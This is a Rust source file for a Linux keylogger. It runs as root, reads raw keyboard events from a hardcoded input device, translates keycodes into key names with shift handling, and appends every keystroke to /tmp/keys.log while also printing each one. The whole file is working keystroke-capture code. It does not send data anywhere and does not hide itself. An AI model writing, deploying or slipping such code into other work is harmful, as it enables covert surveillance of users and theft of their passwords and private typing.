use std::{
    fs::{File, OpenOptions},
    io::{Read, Write},
    str, 
    mem,
};

use libc::input_event;

use crate::common::Common;
use super::input::{
    KEY_NAMES,
    SHIFT_KEY_NAMES,
    MAX_KEYS,
    UK,
    LEFTSHIFT,
    RIGHTSHIFT
};

const DEVICE_PATH: &str = "/dev/input/event5";
const DATA_PATH: &str = "/tmp/keys.log";

const EV_SIZE: usize = mem::size_of::<input_event>();
const EV_KEY: u16 = 1;

pub struct Keylogger { }

impl Common for Keylogger {
    fn find_keyboard(&self) -> bool {
        true
    }

    fn start_logging(&self) {
        if unsafe { libc::geteuid() } != 0 {
            panic!("Must run as root user");
        }

        let mut device_file = File::open(DEVICE_PATH).unwrap();
        let mut data_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(DATA_PATH)
            .unwrap();

        let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  
        let mut shift_pressed = false;

        loop {
            match device_file.read(&mut buf) {
                Ok(num) => {
                    if num != EV_SIZE {
                        continue;
                    }

                    let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
                    if ev.type_ != EV_KEY {
                        continue
                    }

                    let code = ev.code as usize;

                    if ev.value == 1 { // on keypress
                        let key = match ev.code {
                            LEFTSHIFT | RIGHTSHIFT => {
                                shift_pressed = true;
                                continue;
                            },
                            0..=MAX_KEYS => if shift_pressed { SHIFT_KEY_NAMES[code] } else { KEY_NAMES[code] },
                            _ => UK
                        };

                        if data_file.write(key.as_bytes()).unwrap() == 0 { continue };
                        println!("{}", key);
                    } else {
                        match ev.code {
                            LEFTSHIFT | RIGHTSHIFT => {
                                shift_pressed = false;
                                continue;
                            },
                            _ => continue
                        };
                    }
                },
                Err(e) => panic!("Could not read: {}", e)
            }
        }
    }
}
